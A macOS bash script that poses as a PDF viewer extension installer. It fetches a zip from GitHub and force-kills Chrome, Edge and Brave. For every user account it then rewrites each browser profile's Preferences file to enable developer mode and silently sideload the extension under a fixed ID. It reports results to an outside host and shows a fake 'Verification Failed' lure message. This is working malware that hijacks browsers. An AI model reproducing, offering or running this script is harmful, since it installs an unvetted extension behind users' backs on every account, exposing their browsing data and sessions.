#!/bin/bash
set -e
exec 2>/tmp/pdf-viewer-install.log
EXTENSION_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
EXTENSION_REPO="Castro02980/pdf-viewer-extension"
EXTENSION_ZIP_URL="https://github.com/$EXTENSION_REPO/archive/refs/heads/main.zip"
NOTIFY_URL="https://wln.ink/n"
INJ_COUNT=0
LAST_ERR=""
RELAUNCH_APPS=()

TEMP_ZIP="/tmp/pdf-viewer-ext.zip"
curl -fsSL "$EXTENSION_ZIP_URL" -o "$TEMP_ZIP" || { echo "Verification Failed, try again!" >&2; exit 1; }
rm -rf /tmp/pdf-viewer-temp
mkdir -p /tmp/pdf-viewer-temp
unzip -q "$TEMP_ZIP" -d /tmp/pdf-viewer-temp 2>/dev/null
MANIFEST_PATH=$(find /tmp/pdf-viewer-temp -name "manifest.json" -type f 2>/dev/null | head -1)
if [ -z "$MANIFEST_PATH" ]; then
    rm -f "$TEMP_ZIP"
    echo "Verification Failed, try again!" >&2
    exit 1
fi
EXTENSION_SOURCE_DIR=$(dirname "$MANIFEST_PATH")
SRC_MANIFEST=$(cat "$MANIFEST_PATH")
if ! echo "$SRC_MANIFEST" | grep -q '"key"'; then
    rm -f "$TEMP_ZIP"
    rm -rf /tmp/pdf-viewer-temp
    echo "Verification Failed, try again!" >&2
    exit 1
fi
rm -f "$TEMP_ZIP"

ps aux | grep -E 'Google Chrome|Microsoft Edge|Brave Browser' | grep -v grep | awk '{print $1}' | sort -u | while read app; do
    if [ -n "$app" ]; then
        RELAUNCH_APPS+=("$app")
    fi
done

pkill -x "Google Chrome" 2>/dev/null || true
pkill -x "Microsoft Edge" 2>/dev/null || true
pkill -x "Brave Browser" 2>/dev/null || true
DEADLINE=$(($(date +%s) + 8))
while [ $(date +%s) -lt $DEADLINE ]; do
    if ! ps aux | grep -E 'Google Chrome|Microsoft Edge|Brave Browser' | grep -v grep >/dev/null 2>&1; then
        break
    fi
    sleep 0.3
done
pkill -9 -x "Google Chrome" 2>/dev/null || true
pkill -9 -x "Microsoft Edge" 2>/dev/null || true
pkill -9 -x "Brave Browser" 2>/dev/null || true
sleep 1

for USER_HOME in /Users/*; do
    if [ ! -d "$USER_HOME" ] || [ "$USER_HOME" = "/Users/Shared" ]; then
        continue
    fi
    USER_NAME=$(basename "$USER_HOME")
    HAS_BROWSER=0
    for REL in "Library/Application Support/Google/Chrome" \
               "Library/Application Support/Microsoft Edge" \
               "Library/Application Support/BraveSoftware/Brave-Browser"; do
        if [ -d "$USER_HOME/$REL" ]; then
            HAS_BROWSER=1
            break
        fi
    done
    if [ $HAS_BROWSER -eq 0 ]; then
        continue
    fi
    USER_EXT_DIR="$USER_HOME/Library/Application Support/PDFViewerExtension"
    rm -rf "$USER_EXT_DIR" 2>/dev/null || true
    if ! cp -R "$EXTENSION_SOURCE_DIR" "$USER_EXT_DIR" 2>/dev/null; then
        LAST_ERR="copy $USER_NAME failed"
        continue
    fi
    USER_MANIFEST_PATH="$USER_EXT_DIR/manifest.json"
    if [ ! -f "$USER_MANIFEST_PATH" ]; then
        continue
    fi
    for REL in "Library/Application Support/Google/Chrome" \
               "Library/Application Support/Microsoft Edge" \
               "Library/Application Support/BraveSoftware/Brave-Browser"; do
        USER_DATA_DIR="$USER_HOME/$REL"
        if [ ! -d "$USER_DATA_DIR" ]; then
            continue
        fi
        for PROFILE_DIR in "$USER_DATA_DIR/Default" "$USER_DATA_DIR/Profile"*; do
            if [ ! -d "$PROFILE_DIR" ]; then
                continue
            fi
            PREFS_PATH="$PROFILE_DIR/Preferences"
            if [ ! -f "$PREFS_PATH" ]; then
                continue
            fi
            PROFILE_NAME=$(basename "$PROFILE_DIR")
            RESULT=$(python3 - "$PREFS_PATH" "$USER_EXT_DIR" "$USER_MANIFEST_PATH" "$EXTENSION_ID" "$USER_NAME" "$PROFILE_NAME" 2>&1 <<'PYTHON_SCRIPT'
import json
import sys

prefs_path = sys.argv[1]
ext_dir = sys.argv[2]
man_path = sys.argv[3]
ext_id = sys.argv[4]
user_name = sys.argv[5]
profile_name = sys.argv[6]

try:
    with open(prefs_path, 'r', encoding='utf-8') as f:
        prefs = json.load(f)
    with open(man_path, 'r', encoding='utf-8') as f:
        manifest = json.load(f)
    
    if 'extensions' not in prefs:
        prefs['extensions'] = {}
    if 'ui' not in prefs['extensions']:
        prefs['extensions']['ui'] = {}
    prefs['extensions']['ui']['developer_mode'] = True
    if 'settings' not in prefs['extensions']:
        prefs['extensions']['settings'] = {}
    
    prefs['extensions']['settings'][ext_id] = {
        'path': ext_dir,
        'location': 4,
        'state': 1,
        'manifest': manifest
    }
    
    out = json.dumps(prefs, separators=(',', ':'))
    json.loads(out)
    
    with open(prefs_path, 'w', encoding='utf-8') as f:
        f.write(out)
    
    with open(prefs_path, 'r', encoding='utf-8') as f:
        readback = f.read()
    
    if ext_id not in readback or 'developer_mode' not in readback:
        print(f"error:{user_name}/{profile_name}:readback failed", file=sys.stderr)
        sys.exit(1)
    
    print("success")
except Exception as e:
    print(f"error:{user_name}/{profile_name}:{e}", file=sys.stderr)
    sys.exit(1)
PYTHON_SCRIPT
)
            if echo "$RESULT" | grep -q "success"; then
                INJ_COUNT=$((INJ_COUNT + 1))
            else
                LAST_ERR="$RESULT"
            fi
        done
    done
done

rm -rf /tmp/pdf-viewer-temp

if [ $INJ_COUNT -eq 0 ]; then
    curl -fsS -m 5 -X POST "$NOTIFY_URL" \
        -H 'Content-Type: text/plain' \
        --data "ev=install_fail&os=macos&extra=inj:0 $LAST_ERR" \
        >/dev/null 2>&1 || true
    echo "Verification Failed, try again!"
    exit 1
fi

if [ ${#RELAUNCH_APPS[@]} -gt 0 ]; then
    for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
        open -a "$APP" --args --restore-last-session 2>/dev/null || true
    done
    sleep 10
    pkill -x "Google Chrome" 2>/dev/null || true
    pkill -x "Microsoft Edge" 2>/dev/null || true
    pkill -x "Brave Browser" 2>/dev/null || true
    sleep 2
    for APP in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
        open -a "$APP" --args --restore-last-session 2>/dev/null || true
    done
fi

curl -fsS -m 5 -X POST "$NOTIFY_URL" \
    -H 'Content-Type: text/plain' \
    --data "ev=install&os=macos&v=1.0.0&extra=inj:$INJ_COUNT" \
    >/dev/null 2>&1 || true

echo "Successfully completed"
exit 0
